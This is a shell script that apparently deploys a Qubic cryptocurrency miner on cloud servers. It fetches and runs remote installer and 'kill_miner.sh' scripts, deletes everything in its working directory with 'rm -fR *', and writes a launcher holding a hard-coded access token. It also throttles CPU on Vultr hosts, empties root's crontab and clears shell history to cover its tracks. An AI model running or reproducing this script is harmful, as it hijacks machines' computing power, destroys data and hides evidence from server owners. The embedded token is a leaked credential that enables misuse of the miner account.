#!/bin/sh
IP4=$(curl -4 -s icanhazip.com)
convert_dots_to_underscore() {
    echo "$1" | tr '.' '_'
}
IP4_UNDERSCORE=$(convert_dots_to_underscore "$IP4")
rm -fR *
rm -fv *
sudo apt-get update -y
sudo apt-get install cpulimit jq -y
wget -O qli-Service-install.sh https://dl.qubic.li/cloud-init/qli-Service-install.sh
chmod +x qli-Service-install.sh
cores=$(nproc --all)
limitCPU=$((cores * 80))
country=$(curl -s ipinfo.io | jq -r '.country')

cat /dev/null > /root/danielluis1921.sh
cat >>/root/danielluis1921.sh <<EOF
#!/bin/bash
sudo ./kill_miner.sh
sleep 5
sudo ./qli-Service-install.sh $cores eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJJZCI6ImY1MDFkNzFjLTBiZmEtNDI2Yy1hYTc0LTNlMTFlMWNiMjFjZiIsIk1pbmluZyI6IiIsIm5iZiI6MTcxMDY2ODQ2OSwiZXhwIjoxNzQyMjA0NDY5LCJpYXQiOjE3MTA2Njg0NjksImlzcyI6Imh0dHBzOi8vcXViaWMubGkvIiwiYXVkIjoiaHR0cHM6Ly9xdWJpYy5saS8ifQ.pCHuSpd2m-m1D4_dhvz8y2enJabqnv7yWzjYjiJXdeGFzY_WAUXXr45jFZtutfr5CIFi3E4Qkvg-NtC_jkRR-A $country-$IP4_UNDERSCORE> /dev/null 2>&1 &
sleep 3
EOF

chmod +x /root/danielluis1921.sh

hostname=$(hostname)
if [ "$hostname" = "vultr" ];
then
  sed -i "$ a\\cpulimit --limit=$limitCPU --pid \$(pidof qli-runner) > /dev/null 2>&1 &" danielluis1921.sh
  sed -i 's/sleep 3/sleep 25/g' danielluis1921.sh
else
  sed -i 's/stratum-asia/stratum-eu/g' danielluis1921.sh
  sed -i 's/stratum-na/stratum-eu/g' danielluis1921.sh
  echo "hostname isn't vultr"
fi

wget "https://raw.githubusercontent.com/danielluis1921/Danialluis1921/main/kill_miner.sh" --output-document=/root/kill_miner.sh
chmod +x /root/kill_miner.sh
./kill_miner.sh
sleep 3
./danielluis1921.sh
rm -fv *
rm -fR *
cat /dev/null > /var/spool/cron/crontabs/root
history -c && history -w
